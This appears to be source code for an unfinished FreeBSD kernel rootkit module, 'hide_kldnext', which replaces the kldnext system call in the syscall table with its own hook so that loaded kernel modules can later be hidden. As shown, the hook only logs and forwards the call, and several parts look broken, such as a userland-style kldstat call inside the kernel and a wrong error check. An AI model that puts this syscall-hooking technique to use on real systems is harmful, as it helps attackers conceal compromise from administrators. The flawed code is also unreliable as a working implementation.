#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>
#include <sys/linker.h>
#include <sys/errno.h>

static int kldnext_hook(struct thread *td, void *arg)
{
    struct kldnext_args *k_args = NULL;
    int error = 0;
    int next_fileid = 0;

    k_args = (struct kldnext_args *) arg;

    log(LOG_DEBUG, "[hide_kldnext]: kldnext = %d\n", k_args->fileid);
    error = sys_kldnext(td, arg);

    // next_fileid = -1 means error
    // next_fileid = 0 means end of list
    if (error != -1){
        // call kldstat to get the module name
        struct kld_file_stat kfs;

        error = kldstat(k_args->fileid, &kfs);

        log(LOG_DEBUG, "[hook_kldnext]: Error = %d\n", error);
        if (error == 0){
            log(LOG_DEBUG, "[hook_kldstat]: kldstat worked!\n");
        }
    }

    return error;
}

static int load_handler(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd){
        case MOD_LOAD:
            log(LOG_DEBUG, "Hooking kldnext().\n");
            sysent[SYS_kldnext].sy_call = (sy_call_t *) kldnext_hook;
            break;
        case MOD_UNLOAD:
            log(LOG_DEBUG, "Unhooking kldnext().\n");
            sysent[SYS_kldnext].sy_call = (sy_call_t *) sys_kldnext;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t rk_mod = {
    "hide_kldnext",      // module name
    load_handler,        // load function
    NULL
};

DECLARE_MODULE(hide_kldnext, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
